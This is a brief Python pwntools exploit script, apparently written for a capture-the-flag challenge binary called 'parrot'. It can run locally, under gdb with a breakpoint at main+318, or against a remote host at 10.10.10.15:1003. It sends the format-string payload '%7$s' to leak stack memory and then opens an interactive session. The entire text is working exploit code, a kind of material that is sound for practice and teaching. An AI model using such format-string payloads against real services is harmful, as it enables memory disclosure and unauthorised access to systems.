#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./parrot"
#libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("10.10.10.15", 1003)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b *main+318
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


payload = b"%7$s"

p.recvuntil(">")
p.sendline(payload)

p.interactive()
